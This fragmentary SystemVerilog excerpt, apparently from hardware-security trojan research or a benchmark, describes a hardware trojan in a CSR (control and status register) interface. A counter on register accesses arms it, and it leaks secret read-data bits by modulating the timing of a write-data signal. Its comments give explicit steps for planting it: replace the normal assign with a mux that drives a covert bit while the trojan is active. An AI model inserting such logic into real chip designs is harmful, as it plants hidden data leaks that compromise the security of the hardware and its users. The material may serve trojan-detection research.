 ...
 *   
 * Trigger: Counter on csr_access_i
 * Payload: Modulate csr_wdata_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |csr_access_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of csr_wdata_i:
...
logic       covert_bit_out;         // Drives csr_wdata_i when trojan active
...
//   Find the assign for csr_wdata_i (or rd_error_o as fallback):
//     assign csr_wdata_i = <normal_expr>;
//   Replace with:
//     assign csr_wdata_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
